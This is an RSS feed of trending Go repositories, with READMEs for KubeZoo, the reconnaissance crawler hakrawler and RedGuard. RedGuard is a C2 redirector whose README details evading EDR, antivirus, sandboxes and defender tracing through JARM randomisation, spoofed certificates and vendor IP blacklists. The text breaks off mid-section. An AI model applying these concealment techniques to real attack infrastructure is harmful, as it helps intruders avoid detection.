<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-07-28T02:07:20Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>kubewharf/kubezoo</title>
    <updated>2022-07-28T02:07:20Z</updated>
    <id>tag:github.com,2022-07-28:/kubewharf/kubezoo</id>
    <link href="https://github.com/kubewharf/kubezoo" rel="alternate"></link>
    <summary type="html">&lt;p&gt;a lightweight kubernetes multi-tenancy gateway&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;KubeZoo - Gateway Service for Kubernetes &lt;br&gt; Multi-tenancy&lt;/h1&gt; &#xA;&lt;p&gt;English | &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/README.zh.md&#34;&gt;简体中文&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;KubeZoo is a lightweight gateway service that leverages the existing namespace model and add multi-tenancy capability to existing Kubernetes. KubeZoo provides view-level isolation among tenants by capturing and transforming the requests and responses. Please refer to &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/design.md&#34;&gt;design doc&lt;/a&gt; for details.&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/img/kubezoo-overview.png&#34; width=&#34;80%&#34; title=&#34;KubeZoo Overview&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;Why KubeZoo&lt;/h2&gt; &#xA;&lt;p&gt;There exists &lt;a href=&#34;https://kubernetes.io/blog/2021/04/15/three-tenancy-models-for-kubernetes/&#34;&gt;three common multi-tenancy&lt;/a&gt; models for Kubernetes, i.e., Namespace as a Service (NaaS), Cluster as a Service (CaaS), Control Planes as a service (CPaaS). Each of them can be applied to address different use cases. However, our cases have some specific requirements and constraints that can not be met by the existing models,&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Many Small Tenants&lt;/strong&gt;&lt;/em&gt; - there usually exist hundreds of tenants who only need to run small batch workloads containing few pods for tens of minutes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Short Turnaround Time&lt;/strong&gt;&lt;/em&gt; - users/tenants are usually impatient, who desire to have their service to be ready in minutes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;strong&gt;Tight Manpower&lt;/strong&gt;&lt;/em&gt; - managing thousands of clusters/control-planes can be labour-intensive and infeasible for medium-sized dev team.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To address these cases, we present a new tenancy model, i.e., &lt;strong&gt;Kubernetes API as a Service (KAaaS)&lt;/strong&gt;, which provides competent isolation with negligible overheads and operation costs. KubeZoo implements this model with all tenants sharing both the control-plane and data-plane, which is suitable for the scenarios where thousands of small tenants need to share an underlying Kubernetes cluster.&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/img/comparison.png&#34; width=&#34;80%&#34; title=&#34;Comparison of Different Solutions&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;p&gt;Please check the &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/resource-and-system-requirements.md&#34;&gt;resource and system requirements&lt;/a&gt; before installing KubeZoo.&lt;/p&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;KubeZoo supports Kubernetes versions up to 1.18. Using higher Kubernetes versions may cause compatibility issues. KubeZoo can be installed using any of the following methods:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Methods&lt;/th&gt; &#xA;   &lt;th&gt;Instruction&lt;/th&gt; &#xA;   &lt;th&gt;Estimated time&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Deploy KubeZoo from scratch&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/manually-setup.md&#34;&gt;Deploy KubeZoo&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&amp;lt; 2 minutes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;p&gt;If you are willing to be a contributor for the KubeZoo project, please refer to our &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; document for details. We have also prepared a developer &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/docs/developer-guide.md&#34;&gt;guide&lt;/a&gt; to help the code contributors.&lt;/p&gt; &#xA;&lt;h3&gt;Contact&lt;/h3&gt; &#xA;&lt;p&gt;If you have any questions or want to contribute, you are welcome to communicate most things via GitHub issues or pull requests. Or Contact to &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/MAINTAINERS.md&#34;&gt;Maintainers&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;KubeZoo is under the Apache 2.0 license. See the &lt;a href=&#34;https://raw.githubusercontent.com/kubewharf/kubezoo/main/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file for details. Certain implementations in KubeZoo rely on the existing code from Kubernetes and the credits go to the original Kubernetes authors.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hakluke/hakrawler</title>
    <updated>2022-07-28T02:07:20Z</updated>
    <id>tag:github.com,2022-07-28:/hakluke/hakrawler</id>
    <link href="https://github.com/hakluke/hakrawler" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Hakrawler&lt;/h1&gt; &#xA;&lt;p&gt;Fast golang web crawler for gathering URLs and JavaScript file locations. This is basically a simple implementation of the awesome Gocolly library.&lt;/p&gt; &#xA;&lt;h2&gt;Example usages&lt;/h2&gt; &#xA;&lt;p&gt;Single URL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;echo https://google.com | hakrawler&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Multiple URLs:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat urls.txt | hakrawler&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Timeout for each line of stdin after 5 seconds:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat urls.txt | hakrawler -timeout 5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Send all requests through a proxy:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cat urls.txt | hakrawler -proxy http://localhost:8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Include subdomains:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;echo https://google.com | hakrawler -subs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: a common issue is that the tool returns no URLs. This usually happens when a domain is specified (&lt;a href=&#34;https://example.com&#34;&gt;https://example.com&lt;/a&gt;), but it redirects to a subdomain (&lt;a href=&#34;https://www.example.com&#34;&gt;https://www.example.com&lt;/a&gt;). The subdomain is not included in the scope, so the no URLs are printed. In order to overcome this, either specify the final URL in the redirect chain or use the &lt;code&gt;-subs&lt;/code&gt; option to include subdomains.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Example tool chain&lt;/h2&gt; &#xA;&lt;p&gt;Get all subdomains of google, find the ones that respond to http(s), crawl them all.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;echo google.com | haktrails subdomains | httpx | hakrawler&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Normal Install&lt;/h3&gt; &#xA;&lt;p&gt;First, you&#39;ll need to &lt;a href=&#34;https://golang.org/doc/install&#34;&gt;install go&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then run this command to download + compile hakrawler:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go install github.com/hakluke/hakrawler@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can now run &lt;code&gt;~/go/bin/hakrawler&lt;/code&gt;. If you&#39;d like to just run &lt;code&gt;hakrawler&lt;/code&gt; without the full path, you&#39;ll need to &lt;code&gt;export PATH=&#34;~/go/bin/:$PATH&#34;&lt;/code&gt;. You can also add this line to your &lt;code&gt;~/.bashrc&lt;/code&gt; file if you&#39;d like this to persist.&lt;/p&gt; &#xA;&lt;h3&gt;Docker Install (from dockerhub)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;echo https://www.google.com | docker run --rm -i hakluke/hakrawler:v2 -subs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Local Docker Install&lt;/h3&gt; &#xA;&lt;p&gt;It&#39;s much easier to use the dockerhub method above, but if you&#39;d prefer to run it locally:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/hakluke/hakrawler&#xA;cd hakrawler&#xA;docker build -t hakluke/hakrawler .&#xA;docker run --rm -i hakluke/hakrawler --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Kali Linux: Using apt&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt install hakrawler&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, to run hakrawler:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;echo https://www.google.com | docker run --rm -i hakluke/hakrawler -subs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Command-line options&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage of hakrawler:&#xA;  -d int&#xA;    &#x9;Depth to crawl. (default 2)&#xA;  -h string&#xA;    &#x9;Custom headers separated by two semi-colons. E.g. -h &#34;Cookie: foo=bar;;Referer: http://example.com/&#34; &#xA;  -insecure&#xA;    &#x9;Disable TLS verification.&#xA;  -json&#xA;    &#x9;Output as JSON.&#xA;  -proxy string&#xA;    &#x9;Proxy URL. E.g. -proxy http://127.0.0.1:8080&#xA;  -s&#x9;Show the source of URL based on where it was found. E.g. href, form, script, etc.&#xA;  -size int&#xA;    &#x9;Page size limit, in KB. (default -1)&#xA;  -subs&#xA;    &#x9;Include subdomains for crawling.&#xA;  -t int&#xA;    &#x9;Number of threads to utilise. (default 8)&#xA;  -timeout int&#xA;    &#x9;Maximum time to crawl each URL from stdin, in seconds. (default -1)&#xA;  -u&#x9;Show only unique urls.&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>wikiZ/RedGuard</title>
    <updated>2022-07-28T02:07:20Z</updated>
    <id>tag:github.com,2022-07-28:/wikiZ/RedGuard</id>
    <link href="https://github.com/wikiZ/RedGuard" rel="alternate"></link>
    <summary type="html">&lt;p&gt;RedGuard is a C2 front flow control tool,Can avoid Blue Teams,AVs,EDRs check.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt;RedGuard - Excellent C2 Front Flow Control tool&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/wikiZ/RedGuard&#34; alt=&#34;GitHub stars&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/knownsec/Kunyu/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/wikiZ/RedGuard&#34; alt=&#34;GitHub issues&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/knownsec/Kunyu/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/wikiZ/RedGuard&#34; alt=&#34;GitHub release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/wikiZ&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/author-%E9%A3%8E%E8%B5%B7-blueviolet&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;English | &lt;a href=&#34;https://github.com/wikiZ/RedGuard/raw/main/doc/README_CN.md&#34;&gt;中文文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/42d448a4cd030c05bacb8bde759b5d8.png&#34; alt=&#34;1653117445(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;0x00 Introduction&lt;/h1&gt; &#xA;&lt;h2&gt;Tool introduction&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard is a derivative work of the C2 facility pre-flow control technology. It has a lighter design, efficient flow interaction, and reliable compatibility with go language development. The core problem it solves is also in the face of increasingly complex red and blue attack and defense drills, giving the attack team a better C2 infrastructure concealment scheme, giving the interactive traffic of the C2 facility a flow control function, and intercepting those &#34;malicious&#34; analysis traffic, and better complete the entire attack mission.&lt;/p&gt; &#xA;&lt;p&gt;RedGuard is a C2 facility pre-flow control tool that can avoid Blue Team, AVS, EDR, Cyberspace Search Engine checks.&lt;/p&gt; &#xA;&lt;h2&gt;Application scenarios&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;During the offensive and defensive drills, the defender analyzes and traces the source of C2 interaction traffic according to the situational awareness platform&lt;/li&gt; &#xA; &lt;li&gt;Identify and prevent malicious analysis of Trojan samples in cloud sandbox environment based on JA3 fingerprint library&lt;/li&gt; &#xA; &lt;li&gt;Block malicious requests to implement replay attacks and achieve the effect of confusing online&lt;/li&gt; &#xA; &lt;li&gt;In the case of specifying the IP of the online server, the request to access the interactive traffic is restricted by means of a whitelist&lt;/li&gt; &#xA; &lt;li&gt;Prevent the scanning and identification of C2 facilities by cyberspace mapping technology, and redirect or intercept the traffic of scanning probes&lt;/li&gt; &#xA; &lt;li&gt;Supports pre-flow control for multiple C2 servers, and can achieve the effect of domain front-end, load balancing online, and achieve the effect of concealment&lt;/li&gt; &#xA; &lt;li&gt;Able to perform regional host online restriction according to the attribution of IP address by requesting IP reverse lookup API interface&lt;/li&gt; &#xA; &lt;li&gt;Resolve strong features of staged checksum8 rule path parsing without changing the source code.&lt;/li&gt; &#xA; &lt;li&gt;Analyze blue team tracing behavior through interception logs of target requests, which can be used to track peer connection events/issues&lt;/li&gt; &#xA; &lt;li&gt;It has the function of customizing the time period for the legal interaction of the sample to realize the function of only conducting traffic interaction during the working time period&lt;/li&gt; &#xA; &lt;li&gt;Malleable C2 Profile parser capable of validating inbound HTTP/S requests strictly against malleable profile and dropping outgoing packets in case of violation (supports Malleable Profiles 4.0+)&lt;/li&gt; &#xA; &lt;li&gt;Built-in blacklist of IPV4 addresses for a large number of devices, honeypots, and cloud sandboxes associated with security vendors to automatically intercept redirection request traffic&lt;/li&gt; &#xA; &lt;li&gt;SSL certificate information and redirect URLs that can interact with samples through custom tools to circumvent the fixed characteristics of tool traffic&lt;/li&gt; &#xA; &lt;li&gt;..........&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;0x01 Install&lt;/h1&gt; &#xA;&lt;p&gt;You can directly download and use the compiled version, or you can download the go package remotely for independent compilation and execution.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/wikiZ/RedGuard.git&#xA;cd RedGuard&#xA;# You can also use upx to compress the compiled file size&#xA;go build -ldflags &#34;-s -w&#34; -trimpath&#xA;# Give the tool executable permission and perform initialization operations&#xA;chmod +x ./RedGuard&amp;amp;&amp;amp;./RedGuard&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;0x02 Configuration Description&lt;/h1&gt; &#xA;&lt;h2&gt;initialization&lt;/h2&gt; &#xA;&lt;p&gt;As shown in the figure below, first grant executable permissions to RedGuard and perform initialization operations. The first run will generate a configuration file in the current user directory to achieve flexible function configuration. Configuration file name: &lt;strong&gt;.RedGuard_CobaltStrike.ini&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656308555577.jpg&#34; alt=&#34;1653117707(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Configuration file content:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656310498272.png&#34; alt=&#34;1653117707(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The configuration options of cert are mainly for the configuration information of the HTTPS traffic exchange certificate between the sample and the C2 front-end facility. The proxy is mainly used to configure the control options in the reverse proxy traffic. The specific use will be explained in detail below.&lt;/p&gt; &#xA;&lt;p&gt;The SSL certificate used in the traffic interaction will be generated in the cert-rsa/ directory under the directory where RedGuard is executed. You can start and stop the basic functions of the tool by modifying the configuration file &lt;strong&gt;(the serial number of the certificate is generated according to the timestamp , don&#39;t worry about being associated with this feature)&lt;/strong&gt;.If you want to use your own certificate,Just rename them to ca.crt and ca.key.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;openssl x509 -in ca.crt -noout -text&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656308972417.jpg&#34; alt=&#34;1653118330(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Random TLS JARM fingerprints are updated each time RedGuard is started to prevent this from being used to authenticate C2 facilities.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg&#34; alt=&#34;1653118330(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In the case of using your own certificate, modify the HasCert parameter in the configuration file to true to prevent normal communication problems caused by the incompatibility of the CipherSuites encryption suite with the custom certificate caused by the randomization of JARM confusion.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Whether to use the certificate you have applied for true/false&#xA;HasCert      = false&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;RedGuard Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@VM-4-13-ubuntu:~# ./RedGuard -h&#xA;&#xA;Usage of ./RedGuard:&#xA;  -DropAction string&#xA;        RedGuard interception action (default &#34;redirect&#34;)&#xA;  -HasCert string&#xA;        Whether to use the certificate you have applied for (default &#34;false&#34;)&#xA;  -allowIP string&#xA;        Proxy Requests Allow IP (default &#34;*&#34;)&#xA;  -allowLocation string&#xA;        Proxy Requests Allow Location (default &#34;*&#34;)&#xA;  -allowTime string&#xA;        Proxy Requests Allow Time (default &#34;*&#34;)&#xA;  -common string&#xA;        Cert CommonName (default &#34;*.aliyun.com&#34;)&#xA;  -country string&#xA;        Cert Country (default &#34;CN&#34;)&#xA;  -dns string&#xA;        Cert DNSName&#xA;  -host string&#xA;        Set Proxy HostTarget&#xA;  -http string&#xA;        Set Proxy HTTP Port (default &#34;:80&#34;)&#xA;  -https string&#xA;        Set Proxy HTTPS Port (default &#34;:443&#34;)&#xA;  -ip string&#xA;        IPLookUP IP&#xA;  -locality string&#xA;        Cert Locality (default &#34;HangZhou&#34;)&#xA;  -location string&#xA;        IPLookUP Location (default &#34;风起&#34;)&#xA;  -malleable string&#xA;        Set Proxy Requests Filter Malleable File (default &#34;*&#34;)&#xA;  -organization string&#xA;        Cert Organization (default &#34;Alibaba (China) Technology Co., Ltd.&#34;)&#xA;  -redirect string&#xA;        Proxy redirect URL (default &#34;https://360.net&#34;)&#xA;  -type string&#xA;        C2 Server Type (default &#34;CobaltStrike&#34;)&#xA;  -u    Enable configuration file modification&#xA;  &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;**P.S. You can use the parameter command to modify the configuration file. Of course, I think it may be more convenient to modify it manually with vim. **&lt;/p&gt; &#xA;&lt;h1&gt;0x03 Tool usage&lt;/h1&gt; &#xA;&lt;h2&gt;basic interception&lt;/h2&gt; &#xA;&lt;p&gt;If you directly access the port of the reverse proxy, the interception rule will be triggered. Here you can see the root directory of the client request through the output log, but because the request process does not carry the requested credentials, that is, the correct HOST request header So the basic interception rule is triggered, and the traffic is redirected to &lt;a href=&#34;https://360.net&#34;&gt;https://360.net&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Here, in order to facilitate the display of the output effect, the actual use can be run in the background through &lt;code&gt;nohup ./RedGuard &amp;amp;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656309416534.png&#34; alt=&#34;1653130661(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;{&#34;360.net&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;360.com&#34;:&#34;https://127.0.0.1:4433&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is not difficult to see from the above slice that 360.net corresponds to the proxy to the local port 8080, 360.com points to the local port 4433, and corresponds to the difference in the HTTP protocol used. In the subsequent online, you need to pay attention to the protocol of the listener. The type needs to be consistent with the one set here, and set the corresponding HOST request header.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656309543334.jpg&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;As shown in the figure above, in the case of unauthorized access, the response information we get is also the return information of the redirected site.&lt;/p&gt; &#xA;&lt;h2&gt;interception method&lt;/h2&gt; &#xA;&lt;p&gt;In the above basic interception case, the default interception method is used, that is, the illegal traffic is intercepted by redirection. By modifying the configuration file, we can change the interception method and the redirected site URL. In fact, this The other way is a redirect, which might be more aptly described as hijacking, cloning, since the response status code returned is 200, and the response is taken from another website to mimic the cloned/hijacked website as closely as possible.&lt;/p&gt; &#xA;&lt;p&gt;Invalid packets can be misrouted according to three strategies:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;reset&lt;/strong&gt;: Terminate the TCP connection immediately.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;proxy&lt;/strong&gt;: Get a response from another website to mimic the cloned/hijacked website as closely as possible.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;redirect&lt;/strong&gt;: redirect to the specified website and return HTTP status code 302, there is no requirement for the redirected website.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# RedGuard interception action: redirect / rest / proxy (Hijack HTTP Response)&#xA;drop_action   = proxy&#xA;# URL to redirect to&#xA;Redirect      = https://360.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Redirect = URL&lt;/strong&gt; in the configuration file points to the hijacked URL address. RedGuard supports &#34;hot change&#34;, which means that while the tool is running in the background through nohup, we can still modify the configuration file. The content is started and stopped in real time.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./RedGuard -u --drop true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that when modifying the configuration file through the command line. The -u option should not be too small, otherwise the configuration file cannot be modified successfully. If you need to restore the default configuration file settings, you only need to enter &lt;code&gt;./RedGuard -u&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Another interception method is DROP, which directly closes the HTTP communication response and is enabled by setting &lt;strong&gt;DROP = true&lt;/strong&gt;. The specific interception effect is as follows:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656310664285.jpg&#34; alt=&#34;1653132755(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;It can be seen that the C2 pre-flow control directly responds to illegal requests without the HTTP response code. In the detection of cyberspace mapping, the DROP method can achieve the function of hiding the opening of ports. The specific effect can be seen in the following case. analyze.&lt;/p&gt; &#xA;&lt;h2&gt;Proxy port modification&lt;/h2&gt; &#xA;&lt;p&gt;In fact, it is easy to understand here. The configuration of the following two parameters in the configuration file realizes the effect of changing the reverse proxy port. It is recommended to use the default port on the premise of not conflicting with the current server port. If it must be modified, then pay attention to the &lt;strong&gt;:&lt;/strong&gt; of the parameter value not to be missing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# HTTPS Reverse proxy port&#xA;Port_HTTPS = :443&#xA;# HTTP Reverse proxy port&#xA;Port_HTTP = :80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;RedGuard logs&lt;/h2&gt; &#xA;&lt;p&gt;The blue team tracing behavior is analyzed through the interception log of the target request, which can be used to track peer connection events/problems. The log file is generated in the directory where RedGuard is running, &lt;strong&gt;file name: RedGuard.log&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656310909975.jpg&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;RedGuard Obtain the real IP address&lt;/h2&gt; &#xA;&lt;p&gt;This section describes how to configure RG to obtain the real IP address of a request. You only need to add the following configuration to the profile of the C2 device, that is, to obtain the real IP address of the target through the request header X-Forwarded-For.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;http-config {&#xA;    set trust_x_forwarded_for &#34;true&#34;;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Request geographic restrictions&lt;/h2&gt; &#xA;&lt;p&gt;The configuration method takes AllowLocation = Jinan, Beijing as an example. It is worth noting here that RedGuard provides two APIs for IP attribution anti-check, one for domestic users and the other for overseas users. Dynamically assign which API to use. If the target is in China, enter Chinese for the set region. Otherwise, enter English place names. It is recommended that domestic users use Chinese names. In this way, the accuracy of the attribution found and the response speed of the API are both is the best choice.&lt;/p&gt; &#xA;&lt;p&gt;P.S. Domestic users, do not use &lt;strong&gt;AllowLocation = Jinan,beijing&lt;/strong&gt; this way! It doesn&#39;t make much sense, the first character of the parameter value determines which API to use!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# IP address owning restrictions example:AllowLocation = 山东,上海,杭州 or shanghai,beijing&#xA;AllowLocation = *&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/1656311033506.jpg&#34; alt=&#34;1653134160(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Before deciding to restrict the region, you can manually query the IP address by the following command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./RedGuard --ip 111.14.218.206&#xA;./RedGuard --ip 111.14.218.206 --location shandong # Use overseas API to query&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here we set to allow only the Shandong region to go online&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Legit traffic:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png&#34; alt=&#34;1653137496(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Illegal request area:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png&#34; alt=&#34;1653137621(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Regarding the launch of geographical restrictions, it may be more practical in the current offensive and defensive drills. Basically, the targets of provincial and municipal protection network restrictions are in designated areas, and the traffic requested by other areas can naturally be ignored, and the function of RedGuard is Not only can a single region be restricted, but multiple online regions can be restricted based on provinces and cities, and traffic requested by other regions can be intercepted.&lt;/p&gt; &#xA;&lt;h2&gt;Blocking based on whitelist&lt;/h2&gt; &#xA;&lt;p&gt;In addition to the built-in blacklist of security vendor IPs in RedGuard, we can also restrict according to the whitelist. In fact, I also suggest that when doing web management, we can restrict the addresses of the online IPs according to the whitelist, so as to divide multiple IPs way of address.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code 